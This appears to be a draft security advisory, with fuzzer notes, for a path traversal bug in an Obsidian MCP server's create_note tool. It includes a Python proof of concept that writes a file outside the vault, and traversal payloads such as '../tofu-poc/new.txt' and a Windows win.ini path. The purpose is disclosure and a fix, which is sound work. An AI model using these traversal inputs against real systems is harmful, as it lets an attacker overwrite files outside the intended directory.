# Path traversal in `create_note`: `path` can write files outside the vault

**Repository:** `newtype-01/obsidian-mcp` · **Tool:** `create_note` · **Tested commit:** `dc048e4`
**Weakness:** CWE-22 Path Traversal

## Summary
`create_note` writes a note to a caller-supplied `path` inside the configured Obsidian vault. When the
Obsidian Local REST API is not reachable, the tool falls back to the filesystem and joins `path` to the
vault root with no containment check. A `path` containing `../` segments resolves outside the vault, so the
tool writes attacker-chosen content to an arbitrary location the server process can write to.

## Details
`handleCreateNote` passes `path` straight to `createNote` (`src/index.ts:1459`). The filesystem fallback
builds the target with `path.join` and never checks that the result stays under `VAULT_PATH`
(`src/index.ts:2221`):

```ts
private async createNote(notePath: string, content: string): Promise<void> {
  try {
    await this.api.post(`/vault/${encodeURIComponent(notePath)}`, { content });
  } catch (error) {
    // Fallback to file system if API fails
    const fullPath = path.join(VAULT_PATH, notePath);   // 2229: no containment check
    const dir = path.dirname(fullPath);
    if (!fs.existsSync(dir)) { fs.mkdirSync(dir, { recursive: true }); }
    fs.writeFileSync(fullPath, content, 'utf-8');        // 2236: write outside vault
  }
}
```

`node`'s `path.join` collapses `..` segments, so `path.join('/vault', '../x')` yields `/x`. There is no
`path.resolve` + `startsWith(VAULT_PATH)` guard anywhere in the file. The API branch encodes the path for a
URL, but the filesystem branch uses the raw string. The fallback runs whenever the Local REST API is
unreachable, which is the default when the user has not installed and configured that Obsidian plugin.

## Steps to reproduce
1. Prerequisites: Node 16+. Do not run the Obsidian Local REST API (so the filesystem fallback is used; this
   is the default for a fresh install).
2. Build and point the server at an empty vault:
   ```
   npm install && npm run build
   mkdir -p /tmp/tofu-vault /tmp/tofu-poc
   ```
3. Call the tool. Arguments as JSON: `{"path": "../tofu-poc/new.txt", "content": "tofu marker"}`
   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(
           command="node", args=["build/index.js"],
           env={"OBSIDIAN_VAULT_PATH": "/tmp/tofu-vault"})
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool(
                   "create_note",
                   {"path": "../tofu-poc/new.txt", "content": "tofu marker"})
               print(result)

   asyncio.run(main())
   ```
4. Observe that `/tmp/tofu-poc/new.txt` now exists, i.e. a file was written one directory above the vault
   root. `path.join('/tmp/tofu-vault', '../tofu-poc/new.txt')` resolves to `/tmp/tofu-poc/new.txt`. Deeper
   chains (`../../..`) reach any writable location.

## Expected behavior
The resolved target should be rejected (or clamped) unless it stays under `VAULT_PATH`.

## Actual behavior
The write succeeds outside the vault and the tool reports success:
`{'content': [{'type': 'text', 'text': 'Note created successfully at ..\\..\\..\\..\\windows\\win.ini'}]}`
(the success string echoes the caller path regardless of where the file landed).

## Impact
In MCP the `path` argument is chosen by the LLM and can be steered by prompt injection from untrusted content
the model reads. An attacker who influences a tool call can create or overwrite files outside the vault
(config files, scripts, startup files) with content they control, limited only by the server process's write
permissions. Writing is an overwrite primitive: an existing file at the target is replaced.

## Suggested fix
Resolve the final path and confirm containment before any filesystem write, e.g.
`const full = path.resolve(VAULT_PATH, notePath); if (!full.startsWith(path.resolve(VAULT_PATH) + path.sep)) throw ...`.
Apply the same guard to every filesystem fallback in this file (`read_note`, `delete_note`, `move_note`,
`manage_folder`).

## Status on the default branch
Still present at `dc048e4` (2025-08-04). The repository's current default branch head is the same commit that
was tested, and `createNote` is unchanged.

## Prior reports
- #12 "[Potential Vulnerability] arbitrary file read / write / delete via the filesystem fallback in `obsidian-mcp`" (issue, open 2026-07-26): reports this exact bug. It names `create_note`, quotes the same `createNote` fallback (`path.join(VAULT_PATH, notePath)` at `src/index.ts:2229`, `fs.writeFileSync` at `:2236`) and was verified against the same commit `dc048e4`. No maintainer response or fix in the JSON.
- #14 "Request: enable Private Vulnerability Reporting (or share a security contact)" (issue, open 2026-08-19): asks for a private channel for an undisclosed issue and states a 90-day disclosure date of 17 November 2026. No details, so overlap is unknown.
- Documentation: README.md: "Dual API Strategy: Obsidian REST API with filesystem fallback for maximum reliability" (the fallback is documented as a feature; nothing says it is confined to the vault or warns about it). There is no SECURITY.md or docs/ directory.

<details>
<summary>Internal notes (remove before filing)</summary>

- DUPLICATE/FIXED CHECK: already reported in open issue #12 (same function, same lines, same commit). Not fixed. Do not file a new issue; at most add the fuzzer evidence as a comment on #12.
- ToFu class / sanitizers: path-traversal (CWE-22); `check_path_traversal` fired, `check_reflected_output`
  listed for the tool.
- Campaigns and executions: repo24 (192,512 calls / 26,727 ok, 4200s) and e2-0922 (1,024 / 152, 60s).
- Evidence (verbatim, trimmed): input `{'path': '..\\..\\..\\..\\windows\\win.ini', 'content': '...'}`
  -> output `Note created successfully at ..\..\..\..\windows\win.ini`. ToFu: "Silent Bug Alert ... executed
  successfully without raising."
- Hand-check hints: REAL. `path.join(VAULT_PATH, notePath)` at src/index.ts:2229 reaches `fs.writeFileSync`
  with no containment; confirmed no `resolve`+`startsWith` guard anywhere in the file. Caveats to verify by
  hand: (1) the fallback only runs when the Local REST API throws, so a working PoC must run with that API
  unreachable; (2) the evidence payload uses Windows backslashes (`..\..\`) which only traverse on Windows;
  on POSIX a forward-slash `../` payload is what escapes (used in the repro above). The success message is
  printed unconditionally, so it alone does not prove the file landed outside the vault, but the code path
  does.
</details>
